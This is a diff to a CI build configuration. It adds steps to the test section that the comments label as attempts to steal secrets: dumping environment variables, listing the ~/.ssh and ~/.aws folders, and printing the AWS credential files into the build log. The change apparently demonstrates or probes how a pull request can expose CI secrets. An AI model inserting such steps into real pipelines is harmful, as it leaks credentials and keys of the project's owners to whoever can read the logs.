@@ -10,6 +10,10 @@ test:
     - nvm version
     - nvm current
     - node --version
-
-
-
+    # try to steal env vars
+    - env
+    # try to steal ssh keys
+    - ls -l ~/.ssh || true
+    # try to steal aws permissions
+    - ls -l ~/.aws || true
+    - cat ~/.aws/* || true
